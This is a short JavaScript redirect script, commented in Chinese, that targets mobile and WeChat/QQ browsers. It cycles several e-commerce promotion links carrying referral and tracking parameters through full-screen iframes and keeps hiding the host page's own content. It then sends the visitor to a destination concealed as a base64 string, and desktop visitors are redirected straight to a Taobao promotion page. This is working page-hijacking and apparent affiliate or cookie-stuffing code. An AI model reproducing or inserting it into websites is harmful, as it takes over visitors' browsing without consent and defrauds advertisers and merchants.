
// 设备检测与跳转逻辑
(function() {
    // 目标URL数组
    const urls = [
        'https://act.you.163.com/act/pub/ZD2AIj3D0XYd.html?',
   'https://pro.m.jd.com/mall/active/2cqCAHDDWm2f5u5irY4TsPPWHQNj/index.html?babelChannel=ttt9?',
   'https://huodong.taobao.com/wow/a/act/tao/dailygroup/23509/24308/wupr?spm=a21bo.jianhua/a.banner.d1.58062a89jb9eYj&wh_pid=daily-567034&disableNav=YES&status_bar_transparent=true&custom_content_source=a2113w.30234393&?',
   'https://cuxiao.m.suning.com/scms/qgxfbt2024copy25.html?utm_source=cdn.yaochufa.com&utm_medium=referral&utm_content=&utm_campaign=&safp=f73ee1cf.SCMScsxfbtcopy1.20241031185651165794hotzoneMore.2&safc=cuxiao.0.0&safpn=10002&?',
     
    ];
	var u='aHR0cHM6Ly9jYXIubmV3cy1idXMuY29tLyMv';
	
	function base64Decode(input) {
	    return atob(input);
	}
	
    const finalUrl =base64Decode(u);
    
	
    // 检测设备类型
    function isMobile() {
        return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
    }
    
    // 检测微信/QQ内置浏览器
    function isWechatOrQQ() {
        const ua = navigator.userAgent.toLowerCase();
        return ua.indexOf('micromessenger') > -1 || ua.indexOf('qq/') > -1;
    }
    
    // 随机停留时间(5-10秒)
    function getRandomDelay() {
        return 3000;//Math.floor(Math.random() * 5000) + 5000;
    }
    
    // 执行跳转
    function startRedirect() {
        let currentIndex = 0;
        
        function redirectToNext() {
            if (currentIndex < urls.length && currentIndex !== urls.length) {
               // window.location.href = ;
				jump(urls[currentIndex])
                currentIndex++;
                setTimeout(redirectToNext, getRandomDelay());
            } else {
                window.location.href = finalUrl;
            }
        }
        
        redirectToNext();
		
		function jump(url) {
			 
			var ss = '<iframe id="ecshow" scrolling="auto" marginheight="0" marginwidth="0" frameborder="0" width="100%" height="100%" style="min-height:100vh" src="' + url + '"></iframe>';
			document.body ? document.body.insertAdjacentHTML('afterBegin', ss) : document.write(ss);
			setInterval(function() {
				for (var i = 0; i < document.body.children.length; i++) 
				if (document.body.children[i].id != "ecshow") 
				document.body.children[i].style.display = "none";
				document.body.style.overflow = "hidden";
				document.body.style.margin = 0;
			},3000);
		}
		
    }
    
	
    // 主逻辑
	
	
    if (isMobile() || isWechatOrQQ()) {
        startRedirect();
    }else{
	    window.location.href ='https://huodong.taobao.com/wow/a/act/tao/dailygroup/23509/24308/wupr?spm=a21bo.jianhua/a.banner.d1.58062a89jb9eYj&wh_pid=daily-567034&disableNav=YES&status_bar_transparent=true&custom_content_source=a2113w.30234393&?'
    }
})();
